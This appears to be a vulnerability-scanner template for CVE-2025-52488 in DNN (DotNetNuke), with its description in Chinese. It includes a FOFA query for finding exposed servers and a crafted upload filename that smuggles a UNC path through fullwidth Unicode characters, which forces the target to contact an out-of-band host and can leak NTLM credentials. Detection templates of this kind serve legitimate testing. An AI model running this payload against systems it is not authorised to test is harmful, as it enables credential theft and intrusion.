id: CVE-2025-52488

info:
  name: Microsoft DNN NTLM暴露
  author: Superhero
  severity: high
  description: |-
    fofa: app="dotnetnuke" || icon_hash="-1465479343"
    该漏洞利用 Windows/.NET字符处理的特殊性和 Unicode 规范化来强制目标 DNN 服务器向攻击者控制的服务器发出 SMB 请求
  reference:
    - https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-mgfv-2362-jq96
    - https://slcyber.io/assetnote-security-research-center/abusing-windows-net-quirks-and-unicode-normalization-to-exploit-dnn-dotnetnuke/#hunting-variants
  tags: cve,cve2025,dnn,ntlm,microsoft,oob

set:
  oob: oob()
  oobDNS: oob.DNS
  username: randomLowercase(12)
  payload: |
    "%EF%BC%BC%EF%BC%BC" + oobDNS + "%EF%BC%BC%EF%BC%BCc$%EF%BC%BC%EF%BC%BCan.jpg"
  dnsspayload: urldecode(replaceAll(payload,'.','%EF%BC%8E'))
  rboundary: randomLowercase(8)

rules:
  r0:
    request:
      method: POST
      path: /Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx?PortalID=0&storageFolderID=1&overrideFiles=false
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: |-
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{dnsspayload}}"
        Content-Type: image/jpeg

        {{username}}
        ------WebKitFormBoundary{{rboundary}}--
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
